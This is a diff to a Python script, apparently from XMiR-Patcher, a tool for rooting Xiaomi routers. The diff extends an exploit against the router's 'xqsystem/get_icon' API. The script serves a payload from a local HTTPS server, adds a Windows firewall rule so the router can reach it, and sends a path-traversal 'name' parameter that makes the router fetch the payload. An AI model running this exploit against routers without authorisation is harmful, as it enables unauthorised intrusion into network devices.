@@ -19,11 +19,15 @@ except NameError:
     gw = create_gateway(die_if_sshOk = False, web_login = web_password)
 
 api_get_icon_status = 0
+srv_fw_rule = 'XMiR-Patcher'
 srv_ip_addr = None
 srv_port = 8080
 
 with gw.api_request("API/xqsystem/get_icon", stream = True, timeout = 5) as resp:
-    srv_ip_addr, _ = resp.raw._connection.sock.getsockname()
+    try:
+        srv_ip_addr, _ = resp.raw._connection.sock.getsockname()
+    except Exception:
+        raise ExploitNotWorked('Exploit "get_icon" not working!!! (cannot get srv_ip_addr)')
     try:
         resp.raise_for_status()
     except:
@@ -36,25 +40,112 @@ if api_get_icon_status <= 0:
     raise ExploitNotWorked('Exploit "get_icon" not working!!! (api not founded)')
 
 
+import hashlib
+import traceback
+import ctypes
+import subprocess
+
+print('API "xqsystem/get_icon" has been detected! Try to exploit...')
+
+def is_root():
+    if os.name == 'nt':
+        try:
+            rc = ctypes.windll.shell32.IsUserAnAdmin()
+            return bool(rc)
+        except:
+            traceback.print_exc()
+            print("shell32.IsUserAnAdmin() failed -- assuming not an admin.", file = sys.stderr)
+            sys.stderr.flush()
+            return False
+    elif os.name == 'posix':
+        return os.getuid() == 0
+    else:
+        raise RuntimeError('Unsupported os: {!r}'.format(os.name))
+
+def get_firewall_rule(rule_name):
+    cmd = [ 'netsh.exe', 'advfirewall', 'firewall', 'show', 'rule', f'name={rule_name}' ]
+    res = subprocess.run(cmd, capture_output = True, text = True, encoding = 'utf-8', errors = "replace")
+    return res.stdout if res else None
+
+def add_firewall_rule(rule_name, program):
+    import shexec
+    exename = 'netsh.exe'
+    params = f'advfirewall firewall add rule name={rule_name} dir=in action=allow "program={program}" enable=yes protocol=TCP'
+    try:
+        res = shexec.run(exename, params, directory = None)
+        print(f'Rule "{rule_name}" added to Firewall settings')
+        return res
+    except OSError as e:
+        print('ERROR: cannot execute NETSH.EXE')
+        print('ERROR:', str(e))
+    return None
+
+def get_python_exe():
+    fn = sys.executable
+    if os.path.isfile(fn):
+        if os.name != 'nt':
+            return fn
+        if ':\\' in fn:
+            return fn
+    raise RuntimeError('Cannot get python executable filename!')
+    
+def gen_rule_name(prefix, app):
+    if not app:
+        app = get_python_exe()
+    return prefix + '_' + hashlib.md5(app.lower().encode('utf-8')).hexdigest()
+
+if not is_root():
+    print('WARN: The current process does not have root privileges!')
+
+if os.name == 'nt':
+    rule_app = get_python_exe()
+    rule_name = gen_rule_name(srv_fw_rule, rule_app)
+    txt = get_firewall_rule(rule_name)
+    if not txt or f' {rule_name}\n' not in txt:
+        print('WARN: Firewall rule for XMiR-Patcher not founded!')
+        print('INFO: Try add new rule to Windows Firewall...')
+        add_firewall_rule(rule_name, rule_app)
+        time.sleep(0.5)
+
+
+import threading
 from http.server import HTTPServer, SimpleHTTPRequestHandler
 from http.server import BaseHTTPRequestHandler
 from http import HTTPStatus
 from http import server as http_server
+
+srvInitEvent = threading.Event()
 
 class XmirHttpServer(HTTPServer):
     timeout = 3
     retcode = 0
     
     def server_bind(self):
-        HTTPServer.server_bind(self)
+        import ssl
+        root_dir = os.path.dirname(os.path.abspath(__file__))
+        certfile = f'{root_dir}/data/https/cert.crt'
+        keyfile  = f'{root_dir}/data/https/cert.key'
+        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_OPTIONAL
+        ctx.load_cert_chain(certfile = certfile, keyfile = keyfile)
+        self.socket = ctx.wrap_socket(self.socket, server_side = True)
+        super().server_bind()
+        
+    def server_activate(self):
+        global srvInitEvent
+        super().server_activate()
         print(f'SERVER: start and wait request from client...')
+        srvInitEvent.set()
         
     def handle_timeout(self):
         print(f"SERVER: Timed out! (timeout = {self.timeout})")
         self.retcode = -1
         
     def __del__(self):
+        global srvInitEvent
         print(f'SERVER: destroy with retcode = {self.retcode}')
+        srvInitEvent.clear()
 
 class HttpHandler(BaseHTTPRequestHandler):
     protocol_version = 'HTTP/1.1'
@@ -84,7 +175,7 @@ def wait_req_and_send_resp(path, data, bind_addr = '0.0.0.0', ret_code = None, t
     srv = XmirHttpServer((bind_addr, srv_port), HttpHandler)
     srv.action_path = path
     srv.resp_body = data.encode('utf-8') if isinstance(data, str) else data
-    srv.timeout = 5 + timeout
+    srv.timeout = timeout
     srv.handle_request()
     if isinstance(ret_code, list):
         ret_code[0] = srv.retcode
@@ -145,12 +236,16 @@ def install_exploit(api = 'API/xqsystem/get_icon'):
     # exploit public: https://archive.md/1PWkM
     # discovery date: 2024-12-30
     #######
-    global gw, srv_ip_addr, srv_port
+    global gw, srv_ip_addr, srv_port, srvInitEvent
     from threading import Thread
     srv_timeout = 3
     ret_code = [ None ]    
+    srvInitEvent.clear()
     server = Thread(target = wait_req_and_send_resp, args = [ payload_name, payload_body, srv_ip_addr, ret_code, srv_timeout ])
     server.start()
+    event_set = srvInitEvent.wait(timeout = 15)
+    if not event_set:
+        raise RuntimeError(f'Cannot initialize custom HTTPS server on TCP port {srv_port}')
     params = { 'ip': f'{srv_ip_addr}:{srv_port}', 'name': f'/../..{payload_name} dummy' }
     resp = gw.api_request(api, params, stream = True, timeout = 12)
     try:
